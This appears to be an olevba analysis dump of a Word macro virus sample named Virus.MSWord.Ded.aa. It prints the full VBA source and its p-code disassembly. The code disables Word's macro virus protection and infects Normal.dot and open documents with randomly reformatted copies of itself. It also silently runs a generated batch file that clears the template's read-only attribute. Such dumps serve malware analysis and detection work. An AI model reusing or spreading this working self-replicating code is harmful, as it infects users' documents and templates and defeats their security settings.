olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40.13744
          ABS99
'41.27668
skam:
'58.3359
         End Sub
'91.93771
   Private Sub Èäåíòèôèêàòîð()
'47.44592
 End Sub
'39.04715
           Private Sub Document_New()
'8.964139
   16. _
                     10.01

   "òåêñòîâûé äîêóìåíò"
'48.04747
       ()
'4.493385
           On _
Error GoTo skam

  Options.VirusProtection = False
'69.52818
        SWL
'81.46639
          ABS99
'48.98304
skam:
'15.03113
           End Sub
'68.40623
        Private Sub SWL()
'53.30223
      Application. _
                               ShowVisualBasicEditor = False

      If Not ActiveDocument.VBProject. _
        VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

    For I = 1 To NormalTemplate.VBProject. _
        VBComponents(1).CodeModule.CountOfLines

     d = NormalTemplate.VBProject. _
        VBComponents(1).CodeModule.Lines(I, 1)

             If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - _
1, 2) = " _"

  I = I _
+ 1

  d = Left(d, Len(d) _
- 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'72.94109
            d = e(d)
'55.51133
            ActiveDocument. _
                     VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'33.90907
    Next _
I

           ActiveDocument. _
                              SaveAs AddToRecentFiles:=False

     End If
'28.13814
       End Sub
'26.80438
  Private Sub ABS99()
'1.88089
           If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

f _
(NormalTemplate.FullName)

    For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

          d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              If Len(d) > 0 And _
Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

         While Mid(d, Len(d) _
- 1, 2) = " _"

           I _
= I + 1

     d = Left(d, Len(d) - 1) & _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

Wend
'13.9438
  d = _
e(d)

      NormalTemplate. _
                            VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

  End _
If

    Next _
I

              NormalTemplate. _
        Save

         End If
'31.85893
       End Sub
'54.973
Private _
Function e(aString) As String

          aString _
= LTrim(aString)

 aString = RTrim(aString)
'62.66841
              If aString = "Sub " & "Vc()" Then
'64.51331
aString = "Sub " & "ViewVBCode()"
'36.72802
    Else
'45.12395
         If _
aString = "Sub " & "ViewVBCode()" Then

              aString = "Sub " & "Vc()"
'13.31551
           End If
'73.81237
End _
If

    For I _
= 1 To Len(aString) - 1

        If Mid(aString, _
I, 1) = "." Then

     If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

     If Not Mid(aString, _
I + 1, 1) = Chr$(34) Then

         e = _
Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

    For j = 1 To _
Int(15 * Rnd)

       e _
= " " & e

              Next j
'24.41467
        Exit _
Function

End If
'10.01976
             End _
If

 Else
'6.855148
             If Mid(aString, _
I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

      e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

  For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'46.29713
            Next _
j

             Exit _
Function

           End _
If

             End _
If

              End _
If

            Next I
'57.9242
     e = aString _
& Chr$(13) & "'" & (100 * Rnd)

           Count = Int(15 _
* Rnd)

         For _
j = 1 To Count

   e = " " & e
'89.7287
            Next j
'26.29248
         End _
Function

             Private _
Sub f(fName)

           If GetAttr(fName) _
And vbReadOnly Then

          Open Dir(fName) & ".bat" For Append As #1
'23.9589
    Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
'75.68592
 Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

       Close #1
'38.45152
     shellResult = Shell(Dir(fName) _
& ".bat", vbHide)

  End If
'24.6076
           End Sub
'77.10418
          Sub ViewVBCode()
'8.080805
       For _
aDoc = 1 To Documents.Count

       For I _
= 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc). _
    VBProject.VBComponents(1).CodeModule.DeleteLines 1

        Next I
'63.2898
           Next aDoc
'84.91542
       For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

      NormalTemplate.VBProject. _
         VBComponents(1).CodeModule.DeleteLines 1

 Next _
I

           Application.ShowVisualBasicEditor _
= True

              End _
Sub

  Private _
Sub Document_Open()

           End Sub
'65.99275
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.aa
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10766 bytes
' Line #0:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	LineCont 0x0004 03 00 00 00
' 	OnError skam 
' Line #3:
' Line #4:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	ArgsCall SWL 0x0000 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "40.13744"
' Line #8:
' 	ArgsCall ABS99 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0008 "41.27668"
' Line #10:
' 	Label skam 
' Line #11:
' 	QuoteRem 0x0000 0x0007 "58.3359"
' Line #12:
' 	EndSub 
' Line #13:
' 	QuoteRem 0x0000 0x0008 "91.93771"
' Line #14:
' 	FuncDefn (Private Sub Èäåíòèôèêàòîð())
' Line #15:
' 	QuoteRem 0x0000 0x0008 "47.44592"
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "39.04715"
' Line #18:
' 	FuncDefn (Private Sub Document_New())
' Line #19:
' 	QuoteRem 0x0000 0x0008 "8.964139"
' Line #20:
' 	LineCont 0x0004 00 00 FA FF
' 	Reparse 0x0020 "   16.                     10.01"
' Line #21:
' Line #22:
' 	Reparse 0x0017 "   "òåêñòîâûé äîêóìåíò""
' Line #23:
' 	QuoteRem 0x0000 0x0008 "48.04747"
' Line #24:
' 	Reparse 0x0009 "       ()"
' Line #25:
' 	QuoteRem 0x0000 0x0008 "4.493385"
' Line #26:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #27:
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	QuoteRem 0x0000 0x0008 "69.52818"
' Line #30:
' 	ArgsCall SWL 0x0000 
' Line #31:
' 	QuoteRem 0x0000 0x0008 "81.46639"
' Line #32:
' 	ArgsCall ABS99 0x0000 
' Line #33:
' 	QuoteRem 0x0000 0x0008 "48.98304"
' Line #34:
' 	Label skam 
' Line #35:
' 	QuoteRem 0x0000 0x0008 "15.03113"
' Line #36:
' 	EndSub 
' Line #37:
' 	QuoteRem 0x0000 0x0008 "68.40623"
' Line #38:
' 	FuncDefn (Private Sub SWL())
' Line #39:
' 	QuoteRem 0x0000 0x0008 "53.30223"
' Line #40:
' 	LineCont 0x0004 02 00 1F 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #41:
' Line #42:
' 	LineCont 0x0004 06 00 08 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #43:
' Line #44:
' 	LineCont 0x0004 09 00 08 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #45:
' Line #46:
' 	LineCont 0x0004 06 00 08 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #47:
' Line #48:
' 	LineCont 0x0004 06 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #49:
' Line #50:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #51:
' Line #52:
' 	LineCont 0x0004 03 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #53:
' Line #54:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #55:
' Line #56:
' 	Wend 
' Line #57:
' 	QuoteRem 0x0000 0x0008 "72.94109"
' Line #58:
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #59:
' 	QuoteRem 0x0000 0x0008 "55.51133"
' Line #60:
' 	LineCont 0x0004 02 00 15 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	QuoteRem 0x0000 0x0008 "33.90907"
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	LineCont 0x0004 02 00 1E 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #67:
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	QuoteRem 0x0000 0x0008 "28.13814"
' Line #70:
' 	EndSub 
' Line #71:
' 	QuoteRem 0x0000 0x0008 "26.80438"
' Line #72:
' 	FuncDefn (Private Sub ABS99())
' Line #73:
' 	QuoteRem 0x0000 0x0007 "1.88089"
' Line #74:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #75:
' Line #76:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #77:
' Line #78:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #79:
' Line #80:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #81:
' Line #82:
' 	LineCont 0x0004 08 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #83:
' Line #84:
' 	LineCont 0x0004 09 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #85:
' Line #86:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #87:
' Line #88:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #89:
' Line #90:
' 	Wend 
' Line #91:
' 	QuoteRem 0x0000 0x0007 "13.9438"
' Line #92:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #93:
' Line #94:
' 	LineCont 0x0004 02 00 1C 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #95:
' Line #96:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #97:
' Line #98:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' Line #100:
' 	LineCont 0x0004 02 00 08 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #101:
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	QuoteRem 0x0000 0x0008 "31.85893"
' Line #104:
' 	EndSub 
' Line #105:
' 	QuoteRem 0x0000 0x0006 "54.973"
' Line #106:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #107:
' Line #108:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #109:
' Line #110:
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #111:
' 	QuoteRem 0x0000 0x0008 "62.66841"
' Line #112:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	QuoteRem 0x0000 0x0008 "64.51331"
' Line #114:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #115:
' 	QuoteRem 0x0000 0x0008 "36.72802"
' Line #116:
' 	ElseBlock 
' Line #117:
' 	QuoteRem 0x0000 0x0008 "45.12395"
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #119:
' Line #120:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #121:
' 	QuoteRem 0x0000 0x0008 "13.31551"
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	QuoteRem 0x0000 0x0008 "73.81237"
' Line #124:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #125:
' Line #126:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #127:
' Line #128:
' 	LineCont 0x0004 05 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #129:
' Line #130:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #133:
' Line #134:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #135:
' Line #136:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #137:
' Line #138:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #139:
' Line #140:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	QuoteRem 0x0000 0x0008 "24.41467"
' Line #142:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #143:
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x0008 "10.01976"
' Line #146:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #147:
' Line #148:
' 	ElseBlock 
' Line #149:
' 	QuoteRem 0x0000 0x0008 "6.855148"
' Line #150:
' 	LineCont 0x0004 05 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #151:
' Line #152:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #153:
' Line #154:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #155:
' Line #156:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #157:
' Line #158:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #159:
' 	QuoteRem 0x0000 0x0008 "46.29713"
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' Line #162:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #163:
' Line #164:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #165:
' Line #166:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #167:
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #169:
' Line #170:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	QuoteRem 0x0000 0x0007 "57.9242"
' Line #172:
' 	LineCont 0x0004 03 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #173:
' Line #174:
' 	LineCont 0x0004 05 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #175:
' Line #176:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #177:
' Line #178:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #179:
' 	QuoteRem 0x0000 0x0007 "89.7287"
' Line #180:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #181:
' 	QuoteRem 0x0000 0x0008 "26.29248"
' Line #182:
' 	LineCont 0x0004 01 00 00 00
' 	EndFunc 
' Line #183:
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #185:
' Line #186:
' 	LineCont 0x0004 05 00 00 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #187:
' Line #188:
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #189:
' 	QuoteRem 0x0000 0x0007 "23.9589"
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #191:
' 	QuoteRem 0x0000 0x0008 "75.68592"
' Line #192:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #193:
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #195:
' 	QuoteRem 0x0000 0x0008 "38.45152"
' Line #196:
' 	LineCont 0x0004 08 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #197:
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	QuoteRem 0x0000 0x0007 "24.6076"
' Line #200:
' 	EndSub 
' Line #201:
' 	QuoteRem 0x0000 0x0008 "77.10418"
' Line #202:
' 	FuncDefn (Sub ViewVBCode())
' Line #203:
' 	QuoteRem 0x0000 0x0008 "8.080805"
' Line #204:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #205:
' Line #206:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #207:
' Line #208:
' 	LineCont 0x0004 05 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #209:
' Line #210:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #211:
' 	QuoteRem 0x0000 0x0007 "63.2898"
' Line #212:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #213:
' 	QuoteRem 0x0000 0x0008 "84.91542"
' Line #214:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #215:
' Line #216:
' 	LineCont 0x0004 04 00 09 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #217:
' Line #218:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #219:
' Line #220:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #221:
' Line #222:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #223:
' Line #224:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Open())
' Line #225:
' Line #226:
' 	EndSub 
' Line #227:
' 	QuoteRem 0x0000 0x0008 "65.99275"
+----------+--------------------+---------------------------------------------+
